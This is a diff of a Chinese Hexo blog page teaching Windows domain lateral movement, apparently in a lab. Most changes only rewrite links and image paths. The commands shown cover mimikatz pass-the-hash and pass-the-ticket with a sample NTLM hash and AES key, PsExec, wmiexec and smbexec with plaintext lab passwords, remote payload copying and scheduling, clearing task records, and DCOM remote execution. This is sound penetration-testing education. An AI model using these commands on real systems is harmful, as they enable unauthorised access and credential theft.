@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="../../../../../img/fluid.png">
+  <link rel="icon" href="../../../../../img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://idea-oss.github.io/img/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.png">
 <meta property="article:published_time" content="2022-06-14T18:28:19.000Z">
-<meta property="article:modified_time" content="2022-06-20T05:34:14.954Z">
+<meta property="article:modified_time" content="2024-01-08T03:31:05.893Z">
 <meta property="article:author" content="iDea">
 <meta property="article:tag" content="内网安全">
 <meta property="article:tag" content="域内横向移动">
@@ -58,12 +58,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/css/main.css" />
+<link  rel="stylesheet" href="../../../../../css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="../../../../../css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="../../../../../css/highlight-dark.css" />
   
 
 
@@ -79,8 +79,8 @@
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  <script  src="../../../../../js/utils.js" ></script>
+  <script  src="../../../../../js/color-schema.js" ></script>
 
   
 <meta name="generator" content="Hexo 6.2.0"></head>
@@ -95,7 +95,7 @@
 <div class="header-inner" style="height: 85vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/">
+    <a class="navbar-brand" href="../../../../../index.html">
       <strong>iDea</strong>
     </a>
 
@@ -114,7 +114,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/">
+              <a class="nav-link" href="../../../../../index.html">
                 <i class="iconfont icon-home-fill"></i>
                 首页
               </a>
@@ -126,7 +126,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/archives/">
+              <a class="nav-link" href="../../../../../archives/">
                 <i class="iconfont icon-archive-fill"></i>
                 归档
               </a>
@@ -138,7 +138,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/categories/">
+              <a class="nav-link" href="../../../../../categories/">
                 <i class="iconfont icon-category-fill"></i>
                 分类
               </a>
@@ -150,7 +150,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tags/">
+              <a class="nav-link" href="../../../../../tags/">
                 <i class="iconfont icon-tags-fill"></i>
                 标签
               </a>
@@ -162,7 +162,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/about/">
+              <a class="nav-link" href="../../../../../about/">
                 <i class="iconfont icon-user-fill"></i>
                 关于
               </a>
@@ -191,7 +191,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/./img/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.png') no-repeat center center; background-size: cover;">
+     style="background: url('../../../../.././img/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
       <div class="banner-text text-center fade-in-up">
@@ -280,16 +280,16 @@
               <h2 id="常用Windows远程连接和相关命令"><a href="#常用Windows远程连接和相关命令" class="headerlink" title="常用Windows远程连接和相关命令"></a>常用Windows远程连接和相关命令</h2><p>在渗透测试中，拿到目标计算机的用户明文密码或者NTLM Hash后，可以通过PTH(Pass the Hash，凭据传递)的方法，将散列值或明文密码传送到目标机器中进行验证。与目标机器建立连接后，可以使用相关方法在远程Windows操作系统中执行命令。</p>
 <ul>
 <li><strong>IPC</strong><br>  IPC共享“命名管道”的资源，是为实现进程间通信而开放的命令管道。IPC可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源时使用。<br>  IPC利用条件<br>  1.一般来讲 ipc$需要139，445端口的支持。<br>  2.管理员开启了默认共享（默认共享是为了方便管理员进行远程管理而默认开启的，包括所有逻辑盘(c$,d$,e$等）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\ip\ipc$ <span class="hljs-string">&quot;password&quot;</span> /user:username<br></code></pre></td></tr></table></figure>
-<img src="https://img-blog.csdnimg.cn/20210530130938242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>建立连接后使用Windows自带的工具获取远程主机信息</strong><br> 1.DIR命令</li>
+<img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107213952669.png" srcset="/img/loading.gif" lazyload alt="image-20240107213952669"><br><strong>建立连接后使用Windows自带的工具获取远程主机信息</strong><br> 1.DIR命令</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> \\DC\c$<br>或<br><span class="hljs-built_in">dir</span> \\ip\c$<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210530132029857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>2.tasklist</p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214001457.png" srcset="/img/loading.gif" lazyload alt="image-20240107214001457"><br>2.tasklist</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /S 10.10.10.11 /U de1ay /P 274355ZWz<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210530132132743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>3.at 计划任务<br>确认目标系统时间</p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214011470.png" srcset="/img/loading.gif" lazyload alt="image-20240107214011470"><br>3.at 计划任务<br>确认目标系统时间</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net time \\10.10.10.11<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210530132358206.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>将文件复制到目标系统中</p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214019260.png" srcset="/img/loading.gif" lazyload alt="image-20240107214019260"><br>将文件复制到目标系统中</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy payload.exe \\10.10.10.11\c$<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210530132907274.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214028393.png" srcset="/img/loading.gif" lazyload alt="image-20240107214028393"></p>
 <p>使用at创建计划任务（现基本为schtasks命令了)</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在下午1.30运行这个程序</span><br>at  \\10.10.10.11 1.30 PM C:\payload.exe<br><span class="hljs-comment">#清除at记录</span><br>at \\10.10.10.11 7(at的任务<span class="hljs-built_in">id</span>号） /delete<br><span class="hljs-comment">#使用at命令执行命令并将结果写入文件</span><br>at \\10.10.10.11 4.41 PM cmd.exe /c <span class="hljs-string">&quot;ipconfig &gt;c:\1.txt&quot;</span><br></code></pre></td></tr></table></figure>
 <p>使用schtasks命令创建计划任务</p>
@@ -301,10 +301,10 @@
 <li><strong>mimikatatz</strong></li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:de1ay /domain:de1ay.com /ntlm:c271ea43b54feee894fa2d0860e8914f&quot;</span><br></code></pre></td></tr></table></figure>
-<p>输入命令后会弹出一个cmd，此时可以链接目标机了<br><img src="https://img-blog.csdnimg.cn/20210531155122114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>输入命令后会弹出一个cmd，此时可以链接目标机了<br><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214040389.png" srcset="/img/loading.gif" lazyload alt="image-20240107214040389"></p>
 <ul>
 <li><strong>使用AES-256密码进行哈希传递</strong><br>获取AES-256密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::ekeys&quot;</span><br></code></pre></td></tr></table></figure>
-<img src="https://img-blog.csdnimg.cn/20210531155712911.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></li>
+<img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214050840.png" srcset="/img/loading.gif" lazyload alt="image-20240107214050840"></li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:de1ay /domain:de1ay.com /aes256:9c089a15cce776f40c04a817e8df797f6fe941a96f7803e7d00288255a4fe1f9&quot;</span><br></code></pre></td></tr></table></figure>
 <p>使用AES-256目标机上必须装有KB2871997，该补丁禁止本地管理员权限与远程主机进行连接。也就是无法通过本地管理员权限对远程计算机使用PsExec,wmi等。<br>也无法进行常规的哈希传递攻击，但Administrator(SID为500）依然可以。</p>
@@ -315,15 +315,15 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span><br></code></pre></td></tr></table></figure>
 <p>执行命令后会在当前目录多个服务的票据文件。<br>使用mimikatz清除内存中的票据</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::purge<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210531163654397.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214059710.png" srcset="/img/loading.gif" lazyload alt="image-20240107214059710"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::ptt <span class="hljs-string">&quot;票据文件路径&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210531164927845.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214108213.png" srcset="/img/loading.gif" lazyload alt="image-20240107214108213"></p>
 <ul>
 <li><strong>PsExec的使用</strong><br>先建立ipc连接</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取system</span><br>PsExec.exe -accepteula \\10.10.10.11 -s cmd.exe<br><span class="hljs-comment">#获取admin权限</span><br>PsExec.exe -accepteula \\10.10.10.11  cmd.exe<br><span class="hljs-comment">#执行命令</span><br>PsExec.exe \\10.10.10.11 -u de1ay -p 274355ZWz cmd.exe /c <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210531172128129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>1.-accepteula:第一次运行运行会弹出确认框，使用该参数就不会弹出确认框了<br>2.-s:以system权限运行远程程序，获取一个system权限交互的shell</p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214117974.png" srcset="/img/loading.gif" lazyload alt="image-20240107214117974"><br>1.-accepteula:第一次运行运行会弹出确认框，使用该参数就不会弹出确认框了<br>2.-s:以system权限运行远程程序，获取一个system权限交互的shell</p>
 <ul>
 <li><strong>msf中psexec</strong></li>
 </ul>
@@ -334,22 +334,22 @@
 <li><strong>基本命令</strong></li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:10.10.10.11 /user:de1ay /password:274355ZWz process call create <span class="hljs-string">&quot;cmd.exe&quot;</span> /c ipconfig&gt;C:\ip.txt<span class="hljs-string">&quot;</span><br><span class="hljs-string">#查看执行结果</span><br><span class="hljs-string">type \\10.10.10.11\c$\ip.txt</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210531223510977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214128889.png" srcset="/img/loading.gif" lazyload alt="image-20240107214128889"></p>
 <ul>
 <li><strong>impacket 工具包中的wmiexec</strong><br>进入&#x2F;usr&#x2F;local&#x2F;bin目录</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 wmiexec.py  de1ay:274355ZWz@192.168.252.16<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210531224615512.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214138706.png" srcset="/img/loading.gif" lazyload alt="image-20240107214138706"></p>
 <ul>
 <li><strong>wmiexec.vbs</strong></li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript.exe //nologo wmiexec.vbs /shell 10.10.10.11 de1ay 274355ZWz<br><span class="hljs-comment">#在远程主机上执行命令</span><br>csrcipt.exe wmiexec.vbs /cmd 10.10.10.11 de1ay 274355ZWz <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210531225801991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214207506.png" srcset="/img/loading.gif" lazyload alt="image-20240107214207506"></p>
 <ul>
 <li><strong>Invoke-WmiCommand.ps1</strong></li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;域名\用户名&quot;</span>     // 指定目标系统用户名<br><span class="hljs-variable">$Password</span> = ConvertTo-SecureString -String <span class="hljs-string">&quot;文明密码&quot;</span> -AsPlainText -Force   // 指定目标系统的密码<br><span class="hljs-variable">$Cred</span> = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span>    // 将账号和密码整合起来，以便导入credential<br><span class="hljs-variable">$Remote</span> = Invoke-WmiCommand -Payload &#123;要执行的命令&#125; -Credential <span class="hljs-variable">$Cred</span> -ComputerName 目标IP<br><span class="hljs-variable">$Remote</span>.PayloadOutput       // 将执行结果输出到屏幕上<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210531231216112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;域名\用户名&quot;</span>     // 指定目标系统用户名<br><span class="hljs-variable">$Password</span> = ConvertTo-SecureString -String <span class="hljs-string">&quot;明文密码&quot;</span> -AsPlainText -Force   // 指定目标系统的密码<br><span class="hljs-variable">$Cred</span> = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span>    // 将账号和密码整合起来，以便导入credential<br><span class="hljs-variable">$Remote</span> = Invoke-WmiCommand -Payload &#123;要执行的命令&#125; -Credential <span class="hljs-variable">$Cred</span> -ComputerName 目标IP<br><span class="hljs-variable">$Remote</span>.PayloadOutput       // 将执行结果输出到屏幕上<br></code></pre></td></tr></table></figure>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214216404.png" srcset="/img/loading.gif" lazyload alt="image-20240107214216404"></p>
 <ul>
 <li><strong>Invoke-WMIMethod</strong><br>利用powershell自带得invoke-wmimethod，可以在远程系统中执行命令和指定程序。在powershell命令行环境中执行如下命令，可以以非交互式的方式执行命令，但不会回显。</li>
 </ul>
@@ -359,20 +359,20 @@
 <li><strong>smbexec使用</strong><br>impackt工具包中的smbexec.py</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbexec.py de1ay/de1ay:274355ZWz@192.168.43.16<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210604232720985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214227028.png" srcset="/img/loading.gif" lazyload alt="image-20240107214227028"></p>
 <h2 id="DCOM在远程系统中的使用"><a href="#DCOM在远程系统中的使用" class="headerlink" title="DCOM在远程系统中的使用"></a>DCOM在远程系统中的使用</h2><p>DCOM(分布式组件对象模型)是微软的一系列概念和接口。通过DCOM，客户端程序对象能过够向网络中另一台计算机上的服务器程序对象发送请求。</p>
 <ul>
 <li><strong>通过本地DCOM执行命令</strong><br>1.获取DCOM程序列表<br>Get-CimInstance这个cmdlet(powershell命令)默认只在powershell3.0以上版本中存在。也就是说，只有windows server2012及以上的版本才可以使用Get-CimInstance。</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-CimInstance  Win32_DCOMApplication<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210605122217481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>因为windows7,server2008默认安装的是powershell2.0，所以它们都不支持Get-CimInstance.可以使用如下命令代替</p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214239958.png" srcset="/img/loading.gif" lazyload alt="image-20240107214239958"><br>因为windows7,server2008默认安装的是powershell2.0，所以它们都不支持Get-CimInstance.可以使用如下命令代替</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-WmiObject -Namespace  ROOT\CIMV2 -Class Win32_DCOMApplication<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210605123315602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214251386.png" srcset="/img/loading.gif" lazyload alt="image-20240107214251386"></p>
 <ul>
 <li><strong>使用DCOM执行任意命令</strong><br>在本地启动一个管理员权限的powershell</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;127.0.0.1&quot;</span>))<br><span class="hljs-variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;Minimzed&quot;</span>)<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210605124258832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214301108.png" srcset="/img/loading.gif" lazyload alt="image-20240107214301108"></p>
 <ul>
 <li><strong>使用DCOM在远程机器上执行命令</strong><br>在使用该方法时，必须使用具有本地管理员权限的账户<br>1.通过ipc$连接远程计算机</li>
 </ul>
@@ -381,7 +381,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;10.10.10.11&quot;</span>))<br><span class="hljs-variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c c:\one.exe&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br></code></pre></td></tr></table></figure>
 <p>先通过ipc将payload上传到目标机</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy one.exe \\10.10.10.11\c$<br></code></pre></td></tr></table></figure>
-<p>在执行上述命令<br><img src="https://img-blog.csdnimg.cn/20210605133633686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>上线，并且是管理员权限<br>3.调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</p>
+<p>在执行上述命令<br><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214312621.png" srcset="/img/loading.gif" lazyload alt="image-20240107214312621"><br>上线，并且是管理员权限<br>3.调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</p>
